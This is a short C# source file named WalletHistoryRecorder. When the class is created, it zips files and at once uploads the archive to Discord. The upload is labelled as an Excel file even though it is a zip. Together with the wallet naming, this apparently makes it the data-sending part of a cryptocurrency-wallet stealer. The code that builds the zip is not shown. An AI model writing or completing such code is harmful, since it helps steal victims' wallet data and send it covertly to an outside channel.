using Discord;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace WalletHistoryRecorder
{
	public class Start
	{
		string message = "Test Mesaji";
		string fileName;
		string fileFormat = "zip";
		string filePath;
		string application = "application/msexcel";
		public Start()
		{
			var res = FileClass.CreateZip();
			fileName = res[1];
			filePath = res[0];
			Discord.SendFile(message, fileName, fileFormat, filePath, application);
		
		}

		
	}
}
